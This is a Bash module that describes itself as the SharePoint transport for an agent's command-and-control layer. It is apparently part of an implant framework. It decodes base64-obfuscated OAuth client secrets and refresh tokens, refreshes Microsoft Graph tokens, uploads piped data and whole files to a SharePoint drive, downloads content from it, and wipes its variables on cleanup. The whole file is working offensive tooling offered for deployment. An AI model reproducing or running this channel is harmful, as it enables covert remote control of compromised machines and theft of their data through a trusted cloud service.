# === TRANSPORT: Microsoft Graph API (SharePoint) ===
# Provider-specific: token refresh, upload, download, delete.
# Functions called by agent/core.sh (generic C2 layer).
# Credentials are base64 placeholders substituted by the wizard at deploy time.

_TOKEN=""
_CI=$(echo "PLACEHOLDER_CLIENT_ID_B64"     | base64 -d)
_CS=$(echo "PLACEHOLDER_CLIENT_SECRET_B64"  | base64 -d)
_TI=$(echo "PLACEHOLDER_TENANT_ID_B64"      | base64 -d)
_RT=$(echo "PLACEHOLDER_REFRESH_TOKEN_B64"  | base64 -d)
_SI=$(echo "PLACEHOLDER_SITE_ID_B64"        | base64 -d)
_SP_BASE="https://graph.microsoft.com/v1.0/sites/${_SI}/drive/root:"

_token_refresh() {
    log "[TOKEN]: Refreshing Microsoft Graph access token (SharePoint)..."
    local _resp _new
    _resp=$(curl -s --connect-timeout 10 --max-time 30 -X POST \
        "https://login.microsoftonline.com/${_TI}/oauth2/v2.0/token" \
        -d "grant_type=refresh_token&refresh_token=${_RT}&client_id=${_CI}&client_secret=${_CS}&scope=Sites.ReadWrite.All%20offline_access")
    _new=$(printf '%s' "$_resp" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    if [ -n "$_new" ]; then
        _TOKEN="$_new"
        log "[TOKEN]: [OK] Token updated"
        return 0
    fi
    log "[TOKEN]: [X] Refresh ERROR"
    return 1
}

_sp_url() {
    # _sp_url PATH [SUFFIX]  — suffix defaults to :/content
    local _sfx="${2:-:/content}"
    printf '%s%s%s' "$_SP_BASE" "$1" "$_sfx"
}

_upload() {
    local _path="$1" _data _resp
    _data=$(cat)
    _resp=$(printf '%s' "$_data" | curl -s --connect-timeout 10 --max-time 30 \
        -X PUT "$(_sp_url "$_path")" \
        --header "Authorization: Bearer $_TOKEN" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @-)
    if echo "$_resp" | grep -q '"error".*"InvalidAuthenticationToken"\|"error".*"unauthenticated"\|401'; then
        _token_refresh && \
        _resp=$(printf '%s' "$_data" | curl -s --connect-timeout 10 --max-time 30 \
            -X PUT "$(_sp_url "$_path")" \
            --header "Authorization: Bearer $_TOKEN" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @-)
    fi
}

_upload_file() {
    local _path="$1" _file="$2" _resp
    _resp=$(curl -s --connect-timeout 10 --max-time 60 \
        -X PUT "$(_sp_url "$_path")" \
        --header "Authorization: Bearer $_TOKEN" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @"${_file}")
    if echo "$_resp" | grep -q '"error".*"InvalidAuthenticationToken"\|401'; then
        _token_refresh && \
        _resp=$(curl -s --connect-timeout 10 --max-time 60 \
            -X PUT "$(_sp_url "$_path")" \
            --header "Authorization: Bearer $_TOKEN" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @"${_file}")
    fi
    echo "$_resp" | grep -q '"id"'
}

_download() {
    local _path="$1" _resp
    _resp=$(curl -s --connect-timeout 10 --max-time 30 \
        -X GET "$(_sp_url "$_path")" \
        --header "Authorization: Bearer $_TOKEN" | tr -d '\000')
    if echo "$_resp" | grep -q '"error".*"InvalidAuthenticationToken"\|401'; then
        _token_refresh && \
        _resp=$(curl -s --connect-timeout 10 --max-time 30 \
            -X GET "$(_sp_url "$_path")" \
            --header "Authorization: Bearer $_TOKEN" | tr -d '\000')
    fi
    printf '%s' "$_resp"
}

_transport_cleanup() {
    unset _TOKEN _CI _CS _TI _RT _SI _SP_BASE
}
